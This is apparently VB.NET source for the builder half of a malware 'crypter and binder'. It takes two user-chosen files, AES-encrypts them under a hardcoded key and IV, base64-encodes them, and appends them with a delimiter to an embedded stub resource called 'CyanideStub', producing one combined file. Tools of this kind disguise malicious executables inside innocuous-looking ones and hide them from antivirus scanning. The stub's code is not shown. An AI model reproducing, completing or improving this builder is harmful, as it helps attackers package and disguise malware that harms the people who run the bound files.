Public Class Form1
    Dim f, f2 As String
    Function Secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function unSecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = "*.*"
            .Title = "Choose first file..."
            .Filter = "All Files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                f = .SafeFileName
                TextBox1.Text = .FileName

            End If
        End With
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = "*.*"
            .Title = "Choose first file..."
            .Filter = "All Files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                f2 = .SafeFileName
                TextBox2.Text = .FileName

            End If
        End With
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim SFD As New SaveFileDialog
            With SFD
                .FileName = "*.*"
                .Title = "Save file ..."
                .Filter = "All Files (*.*)|*.*"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim sp As String = "(Shittnigz)"
                    Dim buffer As Byte() = My.Resources.CyanideStub
                    My.Computer.FileSystem.WriteAllBytes(.FileName, buffer, False)
                    Dim file1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text))
                    Dim file2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox2.Text))

                    System.IO.File.AppendAllText(.FileName, sp & Convert.ToBase64String(file1) & sp & f & sp & Convert.ToBase64String(file2) & sp & f2)
                    MsgBox("Crypted and Binded Succesful", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")

                End If


            End With
        Catch ex As Exception
            MsgBox("error " + ex.Message, MsgBoxStyle.Critical + "ERROR")
        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
